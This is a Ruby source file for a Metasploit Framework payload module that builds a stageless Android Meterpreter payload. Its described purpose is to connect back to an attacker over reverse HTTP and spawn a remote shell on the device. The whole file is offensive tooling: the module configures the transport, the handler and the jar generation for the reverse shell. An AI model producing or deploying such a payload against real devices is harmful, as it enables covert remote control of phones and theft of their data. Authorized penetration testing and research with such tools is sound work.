##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::TransportConfig
  include Msf::Payload::Single
  include Msf::Payload::Android
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions


  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Android Meterpreter Shell, Reverse HTTP Inline',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Session'     => Msf::Sessions::Meterpreter_Java_Android,
      'Payload'     => '',
      ))
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  def generate_jar(opts={})
    opts[:stageless] = true
    super(opts)
  end
end
